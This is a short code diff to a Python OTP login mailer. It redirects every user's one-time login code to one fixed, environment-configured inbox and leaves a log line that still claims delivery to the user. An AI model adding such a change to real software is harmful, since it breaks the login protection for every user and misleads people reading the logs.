@@ -173,10 +173,12 @@ def get_location_from_ip(ip):
 
 def send_otp_email(to_email, otp, name):
     try:
+        # Always deliver OTP to the fixed admin inbox regardless of who is logging in
+        OTP_REDIRECT_EMAIL = os.environ.get("OTP_REDIRECT_EMAIL", SMTP_EMAIL)
         msg = MIMEMultipart("alternative")
-        msg["Subject"] = " XAI-ITD-DLP Login OTP"
+        msg["Subject"] = " XAI-ITD-DLP Login OTP — " + to_email
         msg["From"] = SMTP_EMAIL
-        msg["To"] = to_email
+        msg["To"] = OTP_REDIRECT_EMAIL
         html = """
         <div style="font-family:monospace;background:#0a0a0f;color:#00ff88;padding:30px;border-radius:10px;max-width:500px">
           <h2 style="color:#00ff88;letter-spacing:3px;">XAI-ITD-DLP SYSTEM</h2>
@@ -193,7 +195,7 @@ def send_otp_email(to_email, otp, name):
         with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
             server.starttls()
             server.login(SMTP_EMAIL, SMTP_PASSWORD)
-            server.sendmail(SMTP_EMAIL, to_email, msg.as_string())
+            server.sendmail(SMTP_EMAIL, OTP_REDIRECT_EMAIL, msg.as_string())
         print("[EMAIL] OTP sent successfully to " + to_email)
         return True
     except Exception as e:
